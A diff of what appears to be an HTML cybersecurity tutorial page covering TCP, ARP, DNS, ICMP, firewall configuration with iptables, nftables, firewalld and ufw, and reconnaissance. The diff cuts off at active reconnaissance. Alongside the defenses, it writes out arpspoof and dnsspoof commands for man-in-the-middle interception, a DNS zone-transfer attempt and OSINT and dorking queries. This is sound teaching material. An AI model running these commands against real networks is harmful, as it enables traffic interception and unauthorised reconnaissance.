@@ -444,15 +444,15 @@
         <p>As data travels down the OSI stack, each layer adds a <strong>header</strong> (and sometimes a trailer). At the receiving end, each layer strips its corresponding header and passes the payload up. Understanding this process is crucial for packet analysis with tools like Wireshark.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">concept</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;Data Flow (Sender -&gt; Receiver):
+          <div class="code-block">Data Flow (Sender -> Receiver):
 
 Layer 7: Application Data
 Layer 6: [Presentation Header] + Application Data
 Layer 5: [Session Header] + [Presentation Header] + Data
-Layer 4: [TCP Header] + [Session Header] + ...  -&gt; Segment
-Layer 3: [IP Header] + [TCP Header] + ...          -&gt; Packet
-Layer 2: [Ethernet Header] + [IP Header] + ... + [Ethernet Trailer] -&gt; Frame
-Layer 1: Bits on the wire&lt;/div&gt;
+Layer 4: [TCP Header] + [Session Header] + ...  -> Segment
+Layer 3: [IP Header] + [TCP Header] + ...          -> Packet
+Layer 2: [Ethernet Header] + [IP Header] + ... + [Ethernet Trailer] -> Frame
+Layer 1: Bits on the wire</div>
         </div>
       </section>
 
@@ -486,21 +486,21 @@ Layer 1: Bits on the wire&lt;/div&gt;
         <h3>TCP Three-Way Handshake</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">tcp</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# TCP 3-Way Handshake (SYN -&gt; SYN-ACK -&gt; ACK)&lt;/span&gt;
-&lt;span class="cmm"&gt;# This establishes a reliable connection before data transfer&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK)</span>
+<span class="cmm"># This establishes a reliable connection before data transfer</span>
 
 Client                    Server
-  |    &lt;span class="var"&gt;SYN&lt;/span&gt; (seq=x)          |
-  | ----------------------&gt; |
-  |    &lt;span class="var"&gt;SYN-ACK&lt;/span&gt; (seq=y, ack=x+1) |
-  | &lt;---------------------- |
-  |    &lt;span class="var"&gt;ACK&lt;/span&gt; (ack=y+1)        |
-  | ----------------------&gt; |
+  |    <span class="var">SYN</span> (seq=x)          |
+  | ----------------------> |
+  |    <span class="var">SYN-ACK</span> (seq=y, ack=x+1) |
+  | <---------------------- |
+  |    <span class="var">ACK</span> (ack=y+1)        |
+  | ----------------------> |
   |                         |
-  |    &lt;span class="cmm"&gt;# Connection established&lt;/span&gt; |
+  |    <span class="cmm"># Connection established</span> |
 
-&lt;span class="cmm"&gt;# Connection teardown (4-way handshake)&lt;/span&gt;
-&lt;span class="cmm"&gt;# FIN -&gt; ACK -&gt; FIN -&gt; ACK&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Connection teardown (4-way handshake)</span>
+<span class="cmm"># FIN -> ACK -> FIN -> ACK</span></div>
         </div>
         <div class="explanation warning">
           <strong>Attack Vector:</strong> The <strong>SYN flood</strong> attack exploits the 3-way handshake by sending SYN packets without completing the handshake, exhausting the server's connection queue. Mitigation includes SYN cookies and connection rate limiting.
@@ -515,62 +515,62 @@ Client                    Server
         <p>ARP maps IP addresses to MAC addresses on a local network. It's a <strong>stateless, trustless</strong> protocol with no authentication — making it vulnerable to poisoning attacks.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# View ARP cache&lt;/span&gt;
-&lt;span class="fn"&gt;arp&lt;/span&gt; -a
-&lt;span class="fn"&gt;ip&lt;/span&gt; neigh
+          <div class="code-block"><span class="cmm"># View ARP cache</span>
+<span class="fn">arp</span> -a
+<span class="fn">ip</span> neigh
 
-&lt;span class="cmm"&gt;# ARP poisoning with arpspoof (Ettercap suite)&lt;/span&gt;
-&lt;span class="cmm"&gt;# Redirect traffic between victim and gateway through attacker&lt;/span&gt;
-&lt;span class="fn"&gt;arpspoof&lt;/span&gt; -i eth0 -t 192.168.1.10 192.168.1.1
-&lt;span class="fn"&gt;arpspoof&lt;/span&gt; -i eth0 -t 192.168.1.1 192.168.1.10
+<span class="cmm"># ARP poisoning with arpspoof (Ettercap suite)</span>
+<span class="cmm"># Redirect traffic between victim and gateway through attacker</span>
+<span class="fn">arpspoof</span> -i eth0 -t 192.168.1.10 192.168.1.1
+<span class="fn">arpspoof</span> -i eth0 -t 192.168.1.1 192.168.1.10
 
-&lt;span class="cmm"&gt;# Enable IP forwarding to act as a man-in-the-middle&lt;/span&gt;
-&lt;span class="fn"&gt;echo&lt;/span&gt; 1 &gt; /proc/sys/net/ipv4/ip_forward
+<span class="cmm"># Enable IP forwarding to act as a man-in-the-middle</span>
+<span class="fn">echo</span> 1 > /proc/sys/net/ipv4/ip_forward
 
-&lt;span class="cmm"&gt;# Defense: Static ARP entries&lt;/span&gt;
-&lt;span class="fn"&gt;arp&lt;/span&gt; -s 192.168.1.1 00:11:22:33:44:55
+<span class="cmm"># Defense: Static ARP entries</span>
+<span class="fn">arp</span> -s 192.168.1.1 00:11:22:33:44:55
 
-&lt;span class="cmm"&gt;# Defense: Dynamic ARP Inspection (DAI) on switches&lt;/span&gt;
-&lt;span class="cmm"&gt;# Validates ARP packets against a trusted database&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Defense: Dynamic ARP Inspection (DAI) on switches</span>
+<span class="cmm"># Validates ARP packets against a trusted database</span></div>
         </div>
 
         <h3>DNS (Domain Name System)</h3>
         <p>DNS translates human-readable domain names to IP addresses. It's a critical attack surface due to its hierarchical, distributed nature.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# DNS query tools&lt;/span&gt;
-&lt;span class="fn"&gt;dig&lt;/span&gt; example.com
-&lt;span class="fn"&gt;dig&lt;/span&gt; @8.8.8.8 example.com MX
-&lt;span class="fn"&gt;dig&lt;/span&gt; +trace example.com
-&lt;span class="fn"&gt;nslookup&lt;/span&gt; example.com
-&lt;span class="fn"&gt;host&lt;/span&gt; example.com
+          <div class="code-block"><span class="cmm"># DNS query tools</span>
+<span class="fn">dig</span> example.com
+<span class="fn">dig</span> @8.8.8.8 example.com MX
+<span class="fn">dig</span> +trace example.com
+<span class="fn">nslookup</span> example.com
+<span class="fn">host</span> example.com
 
-&lt;span class="cmm"&gt;# DNS enumeration with dnsenum&lt;/span&gt;
-&lt;span class="fn"&gt;dnsenum&lt;/span&gt; example.com
+<span class="cmm"># DNS enumeration with dnsenum</span>
+<span class="fn">dnsenum</span> example.com
 
-&lt;span class="cmm"&gt;# DNS spoofing with dnsspoof&lt;/span&gt;
-&lt;span class="fn"&gt;dnsspoof&lt;/span&gt; -i eth0 -f spoofhosts.conf
+<span class="cmm"># DNS spoofing with dnsspoof</span>
+<span class="fn">dnsspoof</span> -i eth0 -f spoofhosts.conf
 
-&lt;span class="cmm"&gt;# Defense: DNSSEC (DNS Security Extensions)&lt;/span&gt;
-&lt;span class="cmm"&gt;# Adds cryptographic signatures to DNS records&lt;/span&gt;
-&lt;span class="fn"&gt;dig&lt;/span&gt; +dnssec example.com DNSKEY&lt;/div&gt;
+<span class="cmm"># Defense: DNSSEC (DNS Security Extensions)</span>
+<span class="cmm"># Adds cryptographic signatures to DNS records</span>
+<span class="fn">dig</span> +dnssec example.com DNSKEY</div>
         </div>
 
         <h3>ICMP (Internet Control Message Protocol)</h3>
         <p>ICMP is used for error reporting and diagnostic functions. While essential for network troubleshooting, it can be abused for reconnaissance and attacks.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Basic ping&lt;/span&gt;
-&lt;span class="fn"&gt;ping&lt;/span&gt; -c 4 8.8.8.8
+          <div class="code-block"><span class="cmm"># Basic ping</span>
+<span class="fn">ping</span> -c 4 8.8.8.8
 
-&lt;span class="cmm"&gt;# ICMP-based attacks&lt;/span&gt;
-&lt;span class="cmm"&gt;# Smurf attack: Send ICMP echo to broadcast, spoof victim source&lt;/span&gt;
-&lt;span class="cmm"&gt;# ICMP redirect: Redirect traffic through attacker&lt;/span&gt;
-&lt;span class="cmm"&gt;# Ping of Death: Oversized ICMP packet causing crash&lt;/span&gt;
+<span class="cmm"># ICMP-based attacks</span>
+<span class="cmm"># Smurf attack: Send ICMP echo to broadcast, spoof victim source</span>
+<span class="cmm"># ICMP redirect: Redirect traffic through attacker</span>
+<span class="cmm"># Ping of Death: Oversized ICMP packet causing crash</span>
 
-&lt;span class="cmm"&gt;# Defense: Rate limit ICMP&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p icmp --icmp-type echo-request -j DROP&lt;/div&gt;
+<span class="cmm"># Defense: Rate limit ICMP</span>
+<span class="fn">iptables</span> -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT
+<span class="fn">iptables</span> -A INPUT -p icmp --icmp-type echo-request -j DROP</div>
         </div>
       </section>
 
@@ -621,40 +621,40 @@ Client                    Server
         <h3>Common iptables Commands</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# List all rules with line numbers and verbose output&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -L -n -v --line-numbers
+          <div class="code-block"><span class="cmm"># List all rules with line numbers and verbose output</span>
+<span class="fn">iptables</span> -L -n -v --line-numbers
 
-&lt;span class="cmm"&gt;# Default policy: DROP everything&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -P INPUT DROP
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -P FORWARD DROP
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -P OUTPUT ACCEPT
+<span class="cmm"># Default policy: DROP everything</span>
+<span class="fn">iptables</span> -P INPUT DROP
+<span class="fn">iptables</span> -P FORWARD DROP
+<span class="fn">iptables</span> -P OUTPUT ACCEPT
 
-&lt;span class="cmm"&gt;# Allow established connections&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+<span class="cmm"># Allow established connections</span>
+<span class="fn">iptables</span> -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
 
-&lt;span class="cmm"&gt;# Allow loopback&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -i lo -j ACCEPT
+<span class="cmm"># Allow loopback</span>
+<span class="fn">iptables</span> -A INPUT -i lo -j ACCEPT
 
-&lt;span class="cmm"&gt;# Allow SSH (rate limited to prevent brute force)&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --dport 22 -j ACCEPT
+<span class="cmm"># Allow SSH (rate limited to prevent brute force)</span>
+<span class="fn">iptables</span> -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
+<span class="fn">iptables</span> -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
+<span class="fn">iptables</span> -A INPUT -p tcp --dport 22 -j ACCEPT
 
-&lt;span class="cmm"&gt;# Allow HTTP and HTTPS&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --dport 80 -j ACCEPT
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --dport 443 -j ACCEPT
+<span class="cmm"># Allow HTTP and HTTPS</span>
+<span class="fn">iptables</span> -A INPUT -p tcp --dport 80 -j ACCEPT
+<span class="fn">iptables</span> -A INPUT -p tcp --dport 443 -j ACCEPT
 
-&lt;span class="cmm"&gt;# Block a specific IP&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -s 192.168.1.100 -j DROP
+<span class="cmm"># Block a specific IP</span>
+<span class="fn">iptables</span> -A INPUT -s 192.168.1.100 -j DROP
 
-&lt;span class="cmm"&gt;# Log and drop suspicious traffic&lt;/span&gt;
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --tcp-flags ALL NONE -j LOG --log-prefix "NULL SCAN: "
-&lt;span class="fn"&gt;iptables&lt;/span&gt; -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
+<span class="cmm"># Log and drop suspicious traffic</span>
+<span class="fn">iptables</span> -A INPUT -p tcp --tcp-flags ALL NONE -j LOG --log-prefix "NULL SCAN: "
+<span class="fn">iptables</span> -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
 
-&lt;span class="cmm"&gt;# Save rules (Debian/Ubuntu)&lt;/span&gt;
-&lt;span class="fn"&gt;iptables-save&lt;/span&gt; &gt; /etc/iptables/rules.v4
-&lt;span class="cmm"&gt;# Restore&lt;/span&gt;
-&lt;span class="fn"&gt;iptables-restore&lt;/span&gt; &lt; /etc/iptables/rules.v4&lt;/div&gt;
+<span class="cmm"># Save rules (Debian/Ubuntu)</span>
+<span class="fn">iptables-save</span> > /etc/iptables/rules.v4
+<span class="cmm"># Restore</span>
+<span class="fn">iptables-restore</span> < /etc/iptables/rules.v4</div>
         </div>
         <div class="explanation warning">
           <strong>Warning:</strong> Setting <code class="inline">-P INPUT DROP</code> before adding ACCEPT rules for your current SSH session will lock you out. Always test firewall rules in a safe environment first.
@@ -668,50 +668,50 @@ Client                    Server
         <p><code class="inline">nftables</code> is the successor to iptables, providing a unified framework for packet filtering, NAT, and packet mangling. It uses a more expressive syntax and better performance.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# List all rules&lt;/span&gt;
-&lt;span class="fn"&gt;nft&lt;/span&gt; list ruleset
+          <div class="code-block"><span class="cmm"># List all rules</span>
+<span class="fn">nft</span> list ruleset
 
-&lt;span class="cmm"&gt;# Basic nftables configuration script&lt;/span&gt;
-&lt;span class="fn"&gt;nft&lt;/span&gt; -f - &lt;&lt;EOF
-&lt;span class="cmm"&gt;#!/usr/sbin/nft -f&lt;/span&gt;
+<span class="cmm"># Basic nftables configuration script</span>
+<span class="fn">nft</span> -f - <<EOF
+<span class="cmm">#!/usr/sbin/nft -f</span>
 
-&lt;span class="kw"&gt;flush&lt;/span&gt; ruleset
+<span class="kw">flush</span> ruleset
 
-&lt;span class="kw"&gt;table&lt;/span&gt; inet filter {
-    &lt;span class="kw"&gt;chain&lt;/span&gt; input {
-        &lt;span class="kw"&gt;type&lt;/span&gt; filter &lt;span class="kw"&gt;hook&lt;/span&gt; input &lt;span class="kw"&gt;priority&lt;/span&gt; 0; &lt;span class="kw"&gt;policy&lt;/span&gt; drop;
+<span class="kw">table</span> inet filter {
+    <span class="kw">chain</span> input {
+        <span class="kw">type</span> filter <span class="kw">hook</span> input <span class="kw">priority</span> 0; <span class="kw">policy</span> drop;
 
-        &lt;span class="cmm"&gt;# Allow loopback&lt;/span&gt;
-        &lt;span class="var"&gt;iif&lt;/span&gt; "lo" &lt;span class="kw"&gt;accept&lt;/span&gt;
+        <span class="cmm"># Allow loopback</span>
+        <span class="var">iif</span> "lo" <span class="kw">accept</span>
 
-        &lt;span class="cmm"&gt;# Allow established connections&lt;/span&gt;
-        &lt;span class="var"&gt;ct state&lt;/span&gt; established,related &lt;span class="kw"&gt;accept&lt;/span&gt;
+        <span class="cmm"># Allow established connections</span>
+        <span class="var">ct state</span> established,related <span class="kw">accept</span>
 
-        &lt;span class="cmm"&gt;# Rate limit SSH&lt;/span&gt;
-        &lt;span class="var"&gt;tcp dport&lt;/span&gt; 22 &lt;span class="var"&gt;ct state&lt;/span&gt; new &lt;span class="kw"&gt;limit rate&lt;/span&gt; 4/minute &lt;span class="kw"&gt;accept&lt;/span&gt;
+        <span class="cmm"># Rate limit SSH</span>
+        <span class="var">tcp dport</span> 22 <span class="var">ct state</span> new <span class="kw">limit rate</span> 4/minute <span class="kw">accept</span>
 
-        &lt;span class="cmm"&gt;# Allow HTTP/HTTPS&lt;/span&gt;
-        &lt;span class="var"&gt;tcp dport&lt;/span&gt; { 80, 443 } &lt;span class="kw"&gt;accept&lt;/span&gt;
+        <span class="cmm"># Allow HTTP/HTTPS</span>
+        <span class="var">tcp dport</span> { 80, 443 } <span class="kw">accept</span>
 
-        &lt;span class="cmm"&gt;# Log dropped packets&lt;/span&gt;
-        &lt;span class="kw"&gt;log&lt;/span&gt; &lt;span class="kw"&gt;prefix&lt;/span&gt; &lt;span class="str"&gt;"DROP: "&lt;/span&gt; &lt;span class="kw"&gt;drop&lt;/span&gt;
+        <span class="cmm"># Log dropped packets</span>
+        <span class="kw">log</span> <span class="kw">prefix</span> <span class="str">"DROP: "</span> <span class="kw">drop</span>
     }
 
-    &lt;span class="kw"&gt;chain&lt;/span&gt; forward {
-        &lt;span class="kw"&gt;type&lt;/span&gt; filter &lt;span class="kw"&gt;hook&lt;/span&gt; forward &lt;span class="kw"&gt;priority&lt;/span&gt; 0; &lt;span class="kw"&gt;policy&lt;/span&gt; drop;
+    <span class="kw">chain</span> forward {
+        <span class="kw">type</span> filter <span class="kw">hook</span> forward <span class="kw">priority</span> 0; <span class="kw">policy</span> drop;
     }
 
-    &lt;span class="kw"&gt;chain&lt;/span&gt; output {
-        &lt;span class="kw"&gt;type&lt;/span&gt; filter &lt;span class="kw"&gt;hook&lt;/span&gt; output &lt;span class="kw"&gt;priority&lt;/span&gt; 0; &lt;span class="kw"&gt;policy&lt;/span&gt; accept;
+    <span class="kw">chain</span> output {
+        <span class="kw">type</span> filter <span class="kw">hook</span> output <span class="kw">priority</span> 0; <span class="kw">policy</span> accept;
     }
 }
 EOF
 
-&lt;span class="cmm"&gt;# Save ruleset&lt;/span&gt;
-&lt;span class="fn"&gt;nft&lt;/span&gt; list ruleset &gt; /etc/nftables.conf
+<span class="cmm"># Save ruleset</span>
+<span class="fn">nft</span> list ruleset > /etc/nftables.conf
 
-&lt;span class="cmm"&gt;# Enable at boot (systemd)&lt;/span&gt;
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; enable nftables&lt;/div&gt;
+<span class="cmm"># Enable at boot (systemd)</span>
+<span class="fn">systemctl</span> enable nftables</div>
         </div>
         <div class="tip-box">
           <strong>Tip:</strong> nftables supports <strong>sets</strong> and <strong>maps</strong> for efficient matching against large collections of IPs, ports, or protocols — much more performant than individual iptables rules.
@@ -725,36 +725,36 @@ EOF
         <p><code class="inline">firewalld</code> provides a dynamically managed firewall with support for network/firewall zones. It uses <code class="inline">nftables</code> (or iptables) as the backend but offers a higher-level, zone-based abstraction.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Check status&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --state
+          <div class="code-block"><span class="cmm"># Check status</span>
+<span class="fn">firewall-cmd</span> --state
 
-&lt;span class="cmm"&gt;# List active zones and their settings&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --get-active-zones
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --zone=public --list-all
+<span class="cmm"># List active zones and their settings</span>
+<span class="fn">firewall-cmd</span> --get-active-zones
+<span class="fn">firewall-cmd</span> --zone=public --list-all
 
-&lt;span class="cmm"&gt;# List available services&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --get-services
+<span class="cmm"># List available services</span>
+<span class="fn">firewall-cmd</span> --get-services
 
-&lt;span class="cmm"&gt;# Add a service permanently&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-service=http
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-service=https
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --reload
+<span class="cmm"># Add a service permanently</span>
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-service=http
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-service=https
+<span class="fn">firewall-cmd</span> --reload
 
-&lt;span class="cmm"&gt;# Add a custom port&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-port=8080/tcp
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --reload
+<span class="cmm"># Add a custom port</span>
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-port=8080/tcp
+<span class="fn">firewall-cmd</span> --reload
 
-&lt;span class="cmm"&gt;# Rich rules (more granular control)&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" service name="ssh" accept'
+<span class="cmm"># Rich rules (more granular control)</span>
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" service name="ssh" accept'
 
-&lt;span class="cmm"&gt;# Block an IP&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="10.0.0.5" reject'
+<span class="cmm"># Block an IP</span>
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-rich-rule='rule family="ipv4" source address="10.0.0.5" reject'
 
-&lt;span class="cmm"&gt;# Rate limiting (similar to fail2ban)&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --add-rich-rule='rule service name=ssh limit value=3/m accept'
+<span class="cmm"># Rate limiting (similar to fail2ban)</span>
+<span class="fn">firewall-cmd</span> --permanent --add-rich-rule='rule service name=ssh limit value=3/m accept'
 
-&lt;span class="cmm"&gt;# IP masquerading (NAT)&lt;/span&gt;
-&lt;span class="fn"&gt;firewall-cmd&lt;/span&gt; --permanent --zone=public --add-masquerade&lt;/div&gt;
+<span class="cmm"># IP masquerading (NAT)</span>
+<span class="fn">firewall-cmd</span> --permanent --zone=public --add-masquerade</div>
         </div>
         <h3>firewalld Zones</h3>
         <table class="data-table">
@@ -780,42 +780,42 @@ EOF
         <p><code class="inline">ufw</code> is a front-end for iptables designed to simplify firewall configuration. It's the recommended firewall tool for beginners on Ubuntu and Debian systems.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Enable UFW&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; enable
+          <div class="code-block"><span class="cmm"># Enable UFW</span>
+<span class="fn">ufw</span> enable
 
-&lt;span class="cmm"&gt;# Default policies&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; default deny incoming
-&lt;span class="fn"&gt;ufw&lt;/span&gt; default allow outgoing
+<span class="cmm"># Default policies</span>
+<span class="fn">ufw</span> default deny incoming
+<span class="fn">ufw</span> default allow outgoing
 
-&lt;span class="cmm"&gt;# Allow SSH (critical — do this first to avoid lockout!)&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow ssh
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow 22/tcp
+<span class="cmm"># Allow SSH (critical — do this first to avoid lockout!)</span>
+<span class="fn">ufw</span> allow ssh
+<span class="fn">ufw</span> allow 22/tcp
 
-&lt;span class="cmm"&gt;# Allow specific services&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow http
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow https
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow 8080/tcp
+<span class="cmm"># Allow specific services</span>
+<span class="fn">ufw</span> allow http
+<span class="fn">ufw</span> allow https
+<span class="fn">ufw</span> allow 8080/tcp
 
-&lt;span class="cmm"&gt;# Allow from specific IP&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow from 192.168.1.0/24
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow from 192.168.1.50 to any port 3306
+<span class="cmm"># Allow from specific IP</span>
+<span class="fn">ufw</span> allow from 192.168.1.0/24
+<span class="fn">ufw</span> allow from 192.168.1.50 to any port 3306
 
-&lt;span class="cmm"&gt;# Deny specific IP&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; deny from 10.0.0.100
+<span class="cmm"># Deny specific IP</span>
+<span class="fn">ufw</span> deny from 10.0.0.100
 
-&lt;span class="cmm"&gt;# Limit connection rate (brute force protection)&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; limit ssh
-&lt;span class="fn"&gt;ufw&lt;/span&gt; limit 22/tcp
+<span class="cmm"># Limit connection rate (brute force protection)</span>
+<span class="fn">ufw</span> limit ssh
+<span class="fn">ufw</span> limit 22/tcp
 
-&lt;span class="cmm"&gt;# Delete a rule&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; delete allow http
-&lt;span class="cmm"&gt;# Or by number:&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; status numbered
-&lt;span class="fn"&gt;ufw&lt;/span&gt; delete 3
+<span class="cmm"># Delete a rule</span>
+<span class="fn">ufw</span> delete allow http
+<span class="cmm"># Or by number:</span>
+<span class="fn">ufw</span> status numbered
+<span class="fn">ufw</span> delete 3
 
-&lt;span class="cmm"&gt;# View status&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; status verbose
-&lt;span class="fn"&gt;ufw&lt;/span&gt; status numbered&lt;/div&gt;
+<span class="cmm"># View status</span>
+<span class="fn">ufw</span> status verbose
+<span class="fn">ufw</span> status numbered</div>
         </div>
         <div class="explanation info">
           <strong>Note:</strong> UFW generates iptables rules behind the scenes. You can view the raw rules with <code class="inline">iptables -L -v -n</code> to understand what UFW is actually doing.
@@ -861,53 +861,53 @@ EOF
         <h3>Passive Reconnaissance</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# WHOIS lookup&lt;/span&gt;
-&lt;span class="fn"&gt;whois&lt;/span&gt; example.com
+          <div class="code-block"><span class="cmm"># WHOIS lookup</span>
+<span class="fn">whois</span> example.com
 
-&lt;span class="cmm"&gt;# DNS enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;dig&lt;/span&gt; example.com ANY
-&lt;span class="fn"&gt;dig&lt;/span&gt; @ns1.example.com example.com axfr   &lt;span class="cmm"&gt;# Zone transfer attempt&lt;/span&gt;
+<span class="cmm"># DNS enumeration</span>
+<span class="fn">dig</span> example.com ANY
+<span class="fn">dig</span> @ns1.example.com example.com axfr   <span class="cmm"># Zone transfer attempt</span>
 
-&lt;span class="cmm"&gt;# Subdomain enumeration&lt;/span&gt;
-&lt;span class="fn"&gt;sublist3r&lt;/span&gt; -d example.com
-&lt;span class="fn"&gt;amass&lt;/span&gt; enum -d example.com
-&lt;span class="fn"&gt;gobuster&lt;/span&gt; dns -d example.com -w /usr/share/wordlists/dns.txt
+<span class="cmm"># Subdomain enumeration</span>
+<span class="fn">sublist3r</span> -d example.com
+<span class="fn">amass</span> enum -d example.com
+<span class="fn">gobuster</span> dns -d example.com -w /usr/share/wordlists/dns.txt
 
-&lt;span class="cmm"&gt;# OSINT with theHarvester&lt;/span&gt;
-&lt;span class="fn"&gt;theHarvester&lt;/span&gt; -d example.com -b all
+<span class="cmm"># OSINT with theHarvester</span>
+<span class="fn">theHarvester</span> -d example.com -b all
 
-&lt;span class="cmm"&gt;# Shodan search (requires API key)&lt;/span&gt;
-&lt;span class="fn"&gt;shodan&lt;/span&gt; search apache
+<span class="cmm"># Shodan search (requires API key)</span>
+<span class="fn">shodan</span> search apache
 
-&lt;span class="cmm"&gt;# Google dorking&lt;/span&gt;
-&lt;span class="cmm"&gt;# site:example.com filetype:pdf&lt;/span&gt;
-&lt;span class="cmm"&gt;# site:example.com inurl:admin&lt;/span&gt;
-&lt;span class="cmm"&gt;# intitle:"index of" "config.json"&lt;/span&gt;
+<span class="cmm"># Google dorking</span>
+<span class="cmm"># site:example.com filetype:pdf</span>
+<span class="cmm"># site:example.com inurl:admin</span>
+<span class="cmm"># intitle:"index of" "config.json"</span>
 
-&lt;span class="cmm"&gt;# Social media and employee enumeration&lt;/span&gt;
-&lt;span class="cmm"&gt;# LinkedIn, GitHub, Twitter for employee info, tech stack&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Social media and employee enumeration</span>
+<span class="cmm"># LinkedIn, GitHub, Twitter for employee info, tech stack</span></div>
         </div>
         <h3>Active Reconnaissance</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Ping sweep to find live hosts&lt;/span&gt;
